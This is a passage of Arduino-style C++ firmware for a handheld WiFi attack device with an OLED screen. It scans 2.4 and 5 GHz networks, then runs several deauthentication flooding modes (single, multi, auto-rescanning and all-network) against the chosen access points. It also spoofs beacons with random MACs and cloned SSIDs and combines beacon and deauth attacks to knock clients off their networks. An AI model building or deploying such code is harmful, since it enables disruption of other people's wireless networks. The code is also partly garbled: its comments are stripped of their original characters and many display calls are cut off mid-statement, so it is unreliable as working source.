    // Resultscan_results
    scan_results = allResults;

    // ：RSSI，
    std::sort(scan_results.begin(), scan_results.end(),
              [](const WiFiScanResult& a, const WiFiScanResult& b) {
                return a.rssi > b.rssi; //
              });

    // Network（RSSI < -90dBm）
    scan_results.erase(
      std::remove_if(scan_results.begin(), scan_results.end(),
                    [](const WiFiScanResult& result) {
                      return result.rssi < -90;
                    }),
      scan_results.end());

    // Result100（50）
    if (scan_results.size() > 100) {
      scan_results.resize(100);
    }

    selectedFlags.assign(scan_results.size(), 0);

    Serial.println("ScanDone， " + String(scan_results.size()) + " Network");

    // DoneInfo
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, 25);
    //.print("Done");
    //.setCursor(5, 40);
    //.print(": " + String(scan_results.size()));
    ////);
    delay(500);

    menustate = 0;
    homeState = 0;
    homeStartIndex = 0;
    break;
  }
}

// ExecScan
void performSingleScan(const char* scanType, unsigned long timeoutMs,
                      std::vector<WiFiScanResult>& allResults,
                      std::set<String>& uniqueSSIDs) {
  updateScanDisplay(scanType);

  // Emptyscan_results，ScanStatusStart
  scan_results.clear();
  g_scanDone = false;
  unsigned long startMs = millis();

  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    while (!g_scanDone && (millis() - startMs) < timeoutMs) {
      delay(10);
    }

    // ScanResultResultMedium（）
    for (const auto& result : scan_results) {
      if (uniqueSSIDs.find(result.ssid) == uniqueSSIDs.end()) {
        uniqueSSIDs.insert(result.ssid);
        allResults.push_back(result);
      }
    }
  }
}

// ChannelScan
void performChannelWiseScan(std::vector<WiFiScanResult>& allResults,
                           std::set<String>& uniqueSSIDs) {
  // 2.4GChannel + 5GChannel
  // 5GChannelDesc：
  // - 36-48: 5.18-5.24 GHz (UNII-1)
  // - 52-64: 5.26-5.32 GHz (UNII-2A)
  // - 100-140: 5.5-5.7 GHz (UNII-2C)
  // - 149-165: 5.745-5.825 GHz (UNII-3)
  int channels[] = {
    // 2.4G - Scan
    1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 14, 5, 10,
    // 5G -  (5.18-5.24 GHz)
    36, 40, 44, 48,
    // 5G - Medium (5.26-5.32 GHz)
    52, 56, 60, 64,
    // 5G - Height (5.5-5.7 GHz)
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
    // 5G - Height (5.745-5.825 GHz)
    149, 153, 157, 161, 165
  };
  int numChannels = sizeof(channels) / sizeof(channels[0]);

  for (int i = 0; i < numChannels; i++) {
    int channel = channels[i];
    String scanType = "Channel" + String(channel);
    updateScanDisplay(scanType.c_str());

    // SettingsChannel
    wext_set_channel(WLAN0_NAME, channel);
    delay(150);

    // SettingsScanTime
    int scanTime;
    if (channel == 1 || channel == 6 || channel == 11) {
      // 2.4GChannel
      scanTime = 3000;
    } else if (channel >= 36 && channel <= 64) {
      // 5G
      scanTime = 2500;
    } else if (channel >= 100 && channel <= 140) {
      // 5GMedium
      scanTime = 2500;
    } else if (channel >= 149 && channel <= 165) {
      // 5GHeight
      scanTime = 2500;
    } else {
      // 2.4GChannel
      scanTime = 2000;
    }

    performSingleScan(scanType.c_str(), scanTime, allResults, uniqueSSIDs);
    delay(300);
  }
}


// HiddenNetworkScan
void performHiddenNetworkScan(std::vector<WiFiScanResult>& allResults,
                            std::set<String>& uniqueSSIDs) {
  // ChannelLengthTimeScan，HiddenNetwork
  // Packet2.4G5GChannel
  int hiddenChannels[] = {
    // 2.4GChannel
    1, 6, 11, 2, 7, 12,
    // 5GChannel
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
    149, 153, 157, 161, 165
  };
  int numChannels = sizeof(hiddenChannels) / sizeof(hiddenChannels[0]);

  for (int i = 0; i < numChannels; i++) {
    int channel = hiddenChannels[i];
    String scanType = "Hidden" + String(channel);
    updateScanDisplay(scanType.c_str());

    wext_set_channel(WLAN0_NAME, channel);
    delay(200);

    // HiddenNetworkLengthScanTime
    int scanTime = (channel >= 36) ? 2500 : 3000; // 5GChannelShort，2.4GChannelLength
    performSingleScan(scanType.c_str(), scanTime, allResults, uniqueSSIDs);
    delay(300);
  }
}

// UpdateScanProgress
void updateScanProgress(int current, int total, const char* strategy) {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  // Title
  int titleW = //.getUTF8Width("ScanMedium...");
  int titleX = (//width() - titleW) / 2;
  //.setCursor(titleX, 10);
  //.print("ScanMedium...");

  // Progress
  String progress = "Progress: " + String(current) + "/" + String(total);
  int progressW = //.getUTF8Width(progress.c_str());
  int progressX = (//width() - progressW) / 2;
  //.setCursor(progressX, 25);
  //.print(progress);

  //
  int strategyW = //.getUTF8Width(strategy);
  int strategyX = (//width() - strategyW) / 2;
  //.setCursor(strategyX, 40);
  //.print(strategy);

  // Progress
  int barWidth = 100;
  int barHeight = 4;
  int barX = (//width() - barWidth) / 2;
  int barY = 50;

  // Bg
  //drawRect(barX, barY, barWidth, barHeight, SSD1306_WHITE);

  // Progress
  int fillWidth = (barWidth * current) / total;
  //fillRect(barX, barY, fillWidth, barHeight, SSD1306_WHITE);

  ////);
}

// UpdateScan
void updateScanDisplay(const char* scanType) {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  int titleW = //.getUTF8Width("ScanMedium...");
  int titleX = (//width() - titleW) / 2;
  //.setCursor(titleX, 15);
  //.print("ScanMedium...");

  int typeW = //.getUTF8Width(scanType);
  int typeX = (//width() - typeW) / 2;
  //.setCursor(typeX, 35);
  //.print(scanType);

  // Progress
  static int animFrame = 0;
  const char* frames[4] = {"|", "/", "-", "\\"};
  //.setCursor(//width() - 20, 50);
  //.print(frames[animFrame % 4]);
  animFrame++;

  ////);
}
// ============ AttackFunc ============
// ChannelStatus -
void processChannelBuckets() {
  // StatusChannel
  if (g_deauthState.currentChannelBucketIndex >= channelBucketsCache.buckets.size()) {
    g_deauthState.currentChannelBucketIndex = 0;
    return;
  }

  auto& bucket = channelBucketsCache.buckets[g_deauthState.currentChannelBucketIndex];
  if (bucket.empty()) {
    g_deauthState.currentChannelBucketIndex++;
    return;
  }

  // SettingsChannel，BSSID
  if (g_deauthState.currentBssidIndexInBucket == 0) {
    setChannelOptimized(allChannels[g_deauthState.currentChannelBucketIndex]);
  }

  // BSSID
  if (g_deauthState.currentBssidIndexInBucket < bucket.size()) {
    sendDeauthBatch(bucket[g_deauthState.currentBssidIndexInBucket],
                    g_deauthState.packetsPerCycle,
                    g_deauthState.packetCount);
    g_deauthState.currentBssidIndexInBucket++;
  } else {
    // ，
    g_deauthState.currentBssidIndexInBucket = 0;
    g_deauthState.currentChannelBucketIndex++;
  }
}

// Channel - Channel
void processChannelBucketsEnhanced() {
  // YesNo
  if (g_deauthState.currentChannelBucketIndex >= channelBucketsCache.buckets.size()) {
    // extrasChannel
    if (g_deauthState.currentTargetIndex < channelBucketsCache.extras.size()) {
      auto& eb = channelBucketsCache.extras[g_deauthState.currentTargetIndex];
      if (!eb.bssids.empty()) {
        setChannelOptimized(eb.channel);
        for (const uint8_t *bssidPtr : eb.bssids) {
          if (g_enhancedDeauthMode) {
            sendDeauthBatchEnhanced(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
          } else {
            sendDeauthBatch(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
          }
        }
      }
      g_deauthState.currentTargetIndex++;
    } else {
      // All，Start
      g_deauthState.currentChannelBucketIndex = 0;
      g_deauthState.currentTargetIndex = 0;
    }
    return;
  }

  auto& bucket = channelBucketsCache.buckets[g_deauthState.currentChannelBucketIndex];
  if (bucket.empty()) {
    g_deauthState.currentChannelBucketIndex++;
    return;
  }

  // SettingsChannel
  setChannelOptimized(allChannels[g_deauthState.currentChannelBucketIndex]);

  // ChannelBSSID（Yes）
  for (const uint8_t *bssidPtr : bucket) {
    if (g_enhancedDeauthMode) {
      sendDeauthBatchEnhanced(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
    } else {
      sendDeauthBatch(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
    }
  }

  // Channel
  g_deauthState.currentChannelBucketIndex++;
}

// StartAttack
void startSingleAttack() {
  g_deauthState.mode = ATTACK_SINGLE;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = perdeauth;
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 100;
  g_deauthState.ledBlinkInterval = 500;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;

  // TargetList（）
  if (!SelectedVector.empty()) {
    channelBucketsCache.clearBuckets();
    for (int idx : SelectedVector) {
      if (idx >= 0 && idx < (int)scan_results.size()) {
        channelBucketsCache.add(scan_results[idx].channel, scan_results[idx].bssid);
      }
    }
    g_deauthState.currentChannelBucketIndex = 0;
    g_deauthState.currentBssidIndexInBucket = 0;

    // TargetParam
    int targetCount = SelectedVector.size();
    if (targetCount > 5) {
      g_deauthState.packetsPerCycle = perdeauth * 2; // TargetAdd
    } else {
      g_deauthState.packetsPerCycle = perdeauth * 3; // Target
    }
  }

  Serial.println("=== StartAttack（） ===");
  Serial.println("Mode: " + String(g_enhancedDeauthMode ? "" : ""));
  showAttackStatusPage("AttackMedium");
  startAttackLED();
}

// Attack
void processSingleAttack() {
  unsigned long now = millis();

  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }

  // ButtonDetect（Freq）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("ConfirmStopAttack")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("AttackMedium");
    }
    g_deauthState.lastButtonCheckMs = now;
  }

  // UIUpdate（Freq）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("AttackMedium");
    g_deauthState.lastUIUpdateMs = now;
  }

  // SendAttackPacket（）
  if (SelectedVector.empty()) {
    // Target
    setChannelOptimized(scan_results[scrollindex].channel);
    if (g_enhancedDeauthMode) {
      sendDeauthBatchEnhanced(scan_results[scrollindex].bssid,
                              g_deauthState.packetsPerCycle,
                              g_deauthState.packetCount);
    } else {
      sendDeauthBatch(scan_results[scrollindex].bssid,
                      g_deauthState.packetsPerCycle,
                      g_deauthState.packetCount);
    }
  } else {
    // Target：ChannelSend（Usage）
    processChannelBucketsEnhanced();
  }

  // LED
  if (g_deauthState.packetCount >= 1000) {
    digitalWrite(LED_R, HIGH);
    delay(5); // LED，HeightAttack
    digitalWrite(LED_R, LOW);
    g_deauthState.packetCount = 0;
  }
}

// Packet：FuncSign
void Single() {
  startSingleAttack();
  // WaitAttackDoneUserStop
  while (g_deauthState.running) {
    processSingleAttack();
  }
}

// StartAttack
void startMultiAttack() {
  g_deauthState.mode = ATTACK_MULTI;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = perdeauth;
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 100;
  g_deauthState.ledBlinkInterval = 500;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;

  // TargetList
  if (!SelectedVector.empty()) {
    channelBucketsCache.clearBuckets();
    for (int idx : SelectedVector) {
      if (idx >= 0 && idx < (int)scan_results.size()) {
        channelBucketsCache.add(scan_results[idx].channel, scan_results[idx].bssid);
      }
    }
    g_deauthState.currentChannelBucketIndex = 0;
    g_deauthState.currentBssidIndexInBucket = 0;

    // TargetParam
    int targetCount = SelectedVector.size();
    if (targetCount > 5) {
      g_deauthState.packetsPerCycle = perdeauth * 2; // TargetAdd
    } else {
      g_deauthState.packetsPerCycle = perdeauth * 3; // Target
    }
  }

  Serial.println("=== StartAttack（） ===");
  Serial.println("Mode: " + String(g_enhancedDeauthMode ? "" : ""));
  showAttackStatusPage("AttackMedium");
  startAttackLED();
}

// Attack
void processMultiAttack() {
  unsigned long now = millis();

  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }

  // ButtonDetect（Freq）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("ConfirmStopAttack")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("AttackMedium");
    }
    g_deauthState.lastButtonCheckMs = now;
  }

  // UIUpdate（Freq）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("AttackMedium");
    g_deauthState.lastUIUpdateMs = now;
  }

  // YesNoTarget
  if (SelectedVector.empty()) {
    return; // Target，Attack
  }

  // UsageChannelTarget
  processChannelBucketsEnhanced();

  // LED
  if (g_deauthState.packetCount >= 200) {
    digitalWrite(LED_R, HIGH);
    delay(5); // LED，HeightAttack
    digitalWrite(LED_R, LOW);
    g_deauthState.packetCount = 0;
  }
}

// Packet：FuncSign
void Multi() {
  startMultiAttack();
  // WaitAttackDoneUserStop
  while (g_deauthState.running) {
    processMultiAttack();
  }
}
void updateSmartTargets() {
  // BackupScanResult
  std::vector<WiFiScanResult> backup_results = scan_results;

  // EmptyScanResultScan
  scan_results.clear();

  // Target
  for (auto& target : smartTargets) {
    target.active = false;
  }

  // ExecScan
  if (scanNetworks() == 0) {  // ScanSuccess
    // UpdateTargetStatus
    for (auto& target : smartTargets) {
      for (const auto& result : scan_results) {
        if (memcmp(target.bssid, result.bssid, 6) == 0) {
          target.active = true;
          target.channel = result.channel;
          break;
        }
      }
    }
  } else {  // ScanFailed
    // RestoreScanResult
    scan_results = std::move(backup_results);
    // RestoreTargetStatus
    for (auto& target : smartTargets) {
      target.active = true;
    }
    Serial.println("Scan failed, restored previous results");
  }
}
// StartAttack
void startAutoSingleAttack() {
  g_deauthState.mode = ATTACK_AUTO_SINGLE;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.lastScanMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = 3; // AttackUsageSmall
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 120;
  g_deauthState.ledBlinkInterval = 600;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;

  // InitTargetList
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    g_deauthState.lastScanMs = millis();
  }

  Serial.println("=== StartAttack（） ===");
  showAttackStatusPage("AttackMedium");
  startAttackLED();
}

// Attack
void processAutoSingleAttack() {
  unsigned long now = millis();

  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }

  // ButtonDetect（Freq）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("ConfirmStopAttack")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("AttackMedium");
    }
    g_deauthState.lastButtonCheckMs = now;
  }

  // UIUpdate（Freq）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("AttackMedium");
    g_deauthState.lastUIUpdateMs = now;
  }

  // ScanUpdate（10）
  if (now - g_deauthState.lastScanMs >= SCAN_INTERVAL) {
    std::vector<WiFiScanResult> backup = scan_results; // BackupResult
    updateSmartTargets();
    if (scan_results.empty()) {
      scan_results = std::move(backup); // ScanFailed，RestoreBackup
    }
    g_deauthState.lastScanMs = now;
  }

  // AttackTarget
  if (smartTargets.empty()) {
    return; // Target，Attack
  }

  for (const auto& target : smartTargets) {
    if (target.active) {  // AttackTarget
      setChannelOptimized(target.channel);
      sendDeauthBatch(target.bssid, g_deauthState.packetsPerCycle, g_deauthState.packetCount);

      // LED
      if (g_deauthState.packetCount >= 500) {
        digitalWrite(LED_R, HIGH);
        delay(5); // LED，HeightAttack
        digitalWrite(LED_R, LOW);
        g_deauthState.packetCount = 0;
      }
      break; // Target
    }
  }
}

// Packet：FuncSign
void AutoSingle() {
  startAutoSingleAttack();
  // WaitAttackDoneUserStop
  while (g_deauthState.running) {
    processAutoSingleAttack();
  }
}
// StartAttack
void startAutoMultiAttack() {
  g_deauthState.mode = ATTACK_AUTO_MULTI;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.lastScanMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = 5; // AttackUsageMedium
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 120;
  g_deauthState.ledBlinkInterval = 600;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;

  // InitTargetList
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    g_deauthState.lastScanMs = millis();
  }

  Serial.println("=== StartAttack（） ===");
  showAttackStatusPage("AttackMedium");
  startAttackLED();
}

// Attack
void processAutoMultiAttack() {
  unsigned long now = millis();

  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }

  // ButtonDetect（Freq）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("ConfirmStopAttack")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("AttackMedium");
    }
    g_deauthState.lastButtonCheckMs = now;
  }

  // UIUpdate（Freq）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("AttackMedium");
    g_deauthState.lastUIUpdateMs = now;
  }

  // ScanUpdate（10）
  if (now - g_deauthState.lastScanMs >= SCAN_INTERVAL) {
    std::vector<WiFiScanResult> backup = scan_results;
    updateSmartTargets();
    if (scan_results.empty()) {
      scan_results = std::move(backup);
    }
    g_deauthState.lastScanMs = now;
  }

  // AttackTarget（）
  if (!smartTargets.empty()) {
    // Target
    while (g_deauthState.currentTargetIndex < smartTargets.size() && !smartTargets[g_deauthState.currentTargetIndex].active) {
      g_deauthState.currentTargetIndex++;
    }
    if (g_deauthState.currentTargetIndex >= smartTargets.size()) {
      g_deauthState.currentTargetIndex = 0;
      // Target
      while (g_deauthState.currentTargetIndex < smartTargets.size() && !smartTargets[g_deauthState.currentTargetIndex].active) {
        g_deauthState.currentTargetIndex++;
      }
    }

    if (g_deauthState.currentTargetIndex < smartTargets.size()) {
      const auto& target = smartTargets[g_deauthState.currentTargetIndex];
      setChannelOptimized(target.channel);
      sendDeauthBatch(target.bssid, g_deauthState.packetsPerCycle, g_deauthState.packetCount);

      // LED
      if (g_deauthState.packetCount >= 100) {
        digitalWrite(LED_R, HIGH);
        delay(5); // LED，HeightAttack
        digitalWrite(LED_R, LOW);
        g_deauthState.packetCount = 0;
      }
      g_deauthState.currentTargetIndex = (g_deauthState.currentTargetIndex + 1) % smartTargets.size();
    }
  }
}

// StartChannelAttack
void startAllAttack() {
  g_deauthState.mode = ATTACK_ALL;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = perdeauth;
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 100;
  g_deauthState.ledBlinkInterval = 500;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;

  // NetworkCreateTarget（Create）
  if (smartTargets.empty()) {
    for (size_t i = 0; i < scan_results.size(); i++) {
      TargetInfo target;
      memcpy(target.bssid, scan_results[i].bssid, 6);
      target.channel = scan_results[i].channel;
      target.active = true;
      smartTargets.push_back(target);
    }
  }

  // TargetList
  channelBucketsCache.clearBuckets();
  for (const auto &t : smartTargets) {
    if (t.active) {
      channelBucketsCache.add(t.channel, t.bssid);
    }
  }
  g_deauthState.currentChannelBucketIndex = 0;
  g_deauthState.currentBssidIndexInBucket = 0;

  // TargetParam
  int targetCount = smartTargets.size();
  if (targetCount > 10) {
    g_deauthState.packetsPerCycle = perdeauth * 2; // LargeTargetAdd
  } else {
    g_deauthState.packetsPerCycle = perdeauth * 3; // Target
  }

  Serial.println("=== StartChannelAttack（） ===");
  Serial.println("Mode: " + String(g_enhancedDeauthMode ? "" : ""));
  showAttackStatusPage("ChannelAttackMedium");
  startAttackLED();
}

// ChannelAttack
void processAllAttack() {
  unsigned long now = millis();

  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }

  // ButtonDetect（Freq）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("ConfirmStopAttack")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("ChannelAttackMedium");
    }
    g_deauthState.lastButtonCheckMs = now;
  }

  // UIUpdate（Freq）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("ChannelAttackMedium");
    g_deauthState.lastUIUpdateMs = now;
  }

  // UsageChannelTarget
  processChannelBucketsEnhanced();

  // LED
  if (g_deauthState.packetCount >= 100) {
    digitalWrite(LED_R, HIGH);
    delay(5); // LED，HeightAttack
    digitalWrite(LED_R, LOW);
    g_deauthState.packetCount = 0;
  }
}

// StartBeacon+DeauthAttack
void startBeaconDeauthAttack() {
  g_deauthState.mode = ATTACK_BEACON_DEAUTH;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = 1; // BeaconAttackUsageSmall
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 100;
  g_deauthState.ledBlinkInterval = 800;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;

  Serial.println("=== StartBeacon+DeauthAttack（） ===");
  showAttackStatusPage("Beacon+DeauthAttackMedium");
  startAttackLED();
}

// Beacon+DeauthAttack
void processBeaconDeauthAttack() {
  unsigned long now = millis();

  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }

  // ButtonDetect（Freq）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("ConfirmStopAttack")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("Beacon+DeauthAttackMedium");
    }
    g_deauthState.lastButtonCheckMs = now;
  }

  // UIUpdate（Freq）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("Beacon+DeauthAttackMedium");
    g_deauthState.lastUIUpdateMs = now;
  }

  // Beacon+DeauthAttack
  if (!SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        String ssid1 = scan_results[selectedIndex].ssid;
        setChannelOptimized(scan_results[selectedIndex].channel);

        // SendBeaconFrame
        const int cloneCount = 6;
        uint8_t tempMac[6];
        for (int c = 0; c < cloneCount; c++) {
          generateRandomMAC(tempMac);
          for (int x = 0; x < 10; x++) {
            wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, ssid1.c_str());
          }
        }

        // SendDeauthFrame
        if (g_enhancedDeauthMode) {
          sendDeauthBatchEnhanced(scan_results[selectedIndex].bssid,
                                  g_deauthState.packetsPerCycle,
                                  g_deauthState.packetCount);
        } else {
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 1, 1, g_deauthState.packetCount, 5);
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 4, 1, g_deauthState.packetCount, 5);
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 16, 1, g_deauthState.packetCount, 5);
        }

        // LED
        if (g_deauthState.packetCount >= 100) {
          digitalWrite(LED_R, HIGH);
          delay(10);
          digitalWrite(LED_R, LOW);
          g_deauthState.packetCount = 0;
        }
        break; // Target
      }
    }
  }
}

// Packet：FuncSign
void AutoMulti() {
  startAutoMultiAttack();
  // WaitAttackDoneUserStop
  while (g_deauthState.running) {
    processAutoMultiAttack();
  }
}
// Packet：FuncSign
void All() {
  startAllAttack();
  // WaitAttackDoneUserStop
  while (g_deauthState.running) {
    processAllAttack();
  }
}


// Packet：FuncSign
void BeaconDeauth() {
  startBeaconDeauthAttack();
  // WaitAttackDoneUserStop
  while (g_deauthState.running) {
    processBeaconDeauthAttack();
  }
}
void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  // MAC
  mac[0] &= 0xFC; // Clear
  mac[0] |= 0x02; // Settings
}

// ===== BeaconAttackFunc =====
// GenSSID
String generateRandomSuffix() {
  String suffix = "";
  suffix += char('a' + (random(0,26)));
  suffix += char('a' + (random(0,26)));
  return suffix;
}

// CreateSSID
String createFakeSSID(const String& originalSSID) {
  return originalSSID + String("(") + generateRandomSuffix() + String(")");
}

// ChannelSendBeaconFrame
void sendBeaconOnChannel(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
  wext_set_channel(WLAN0_NAME, channel);
  for (int c = 0; c < cloneCount; c++) {
    uint8_t tempMac[6];
    generateRandomMAC(tempMac);
    String fakeSsid = createFakeSSID(String(ssid));
    const char *fakeSsidCstr = fakeSsid.c_str();

    for (int x = 0; x < sendCount; x++) {
      wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, fakeSsidCstr);
      if (delayMs > 0) delay(delayMs);
    }
    if (delayMs > 0) delay(delayMs * 2); // Clone
  }
}

// ===== ConnectJam：ChannelSpoofBeaconDetectResponse =====

// Func：ConnectJamAttackStatus
void drawLinkJammerStatusPage(const String& ssid, bool clearDisplay = true) {
  if (clearDisplay) {
    //clearDisplay();
  }
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  // Title
  oledDrawCenteredLine("[ChannelJamMedium]", 18);

  // SSID
  oledDrawCenteredLine(ssid.c_str(), 32);

  // Hint
  const char* bottomHint = "Target";
  int hintWidth = //.getUTF8Width(bottomHint);
  int hintX = (//width() - hintWidth) / 2;
  //.setCursor(hintX, 46);
  //.print(bottomHint);

  if (clearDisplay) {
    ////);
  }
}

// Func：BeaconBroadcastStatus
void drawBeaconTamperStatusPage(const String& status, bool clearDisplay = true) {
  if (clearDisplay) {
    //clearDisplay();
  }
  //.setFontMode(1);
